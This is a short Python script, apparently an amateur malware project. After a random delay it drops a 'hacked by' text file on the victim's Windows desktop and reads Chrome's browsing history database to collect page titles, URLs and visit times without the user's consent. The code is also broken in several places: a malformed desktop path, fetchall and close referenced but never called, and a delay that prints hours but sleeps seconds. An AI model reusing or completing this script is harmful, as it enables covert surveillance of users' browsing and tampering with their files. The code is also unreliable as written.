import os
from time import sleep
from random import randrange
import sqlite3

from matplotlib.pyplot import get


HACKER_FILE_NAME = "README.txt"


def delay_action():
    n_hours = randrange(1, 4)
    print("Sleeping {} hours".format(n_hours))
    sleep(n_hours)   


def create_hacker_file(user_path):
        hack_file =  open(user_path + "Desktop\\"+ HACKER_FILE_NAME, "w")
        hack_file.write("H4cKeD bY ZvdY")
        return hack_file


def get_chrome_history(user_path):
    try:
        history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall
        connection.close
        return urls
    except sqlite3.OperationalError:
        return None


def main():
    delay_action()
    # Desktop Path & User Path
    # Create route
    user_path = "C:\\Users\\" + os.getlogin()
    # Linux
    #user_path = "/home/" + os.getlogin()
    #desktop_path = "/home/" + os.getlogin() + "/Desktop/" 
    
    # Create file
    hack_file = create_hacker_file(user_path)
    
    # Fetch data
    chrome_history = get_chrome_history(user_path)     



if __name__ == "__main__":
    main()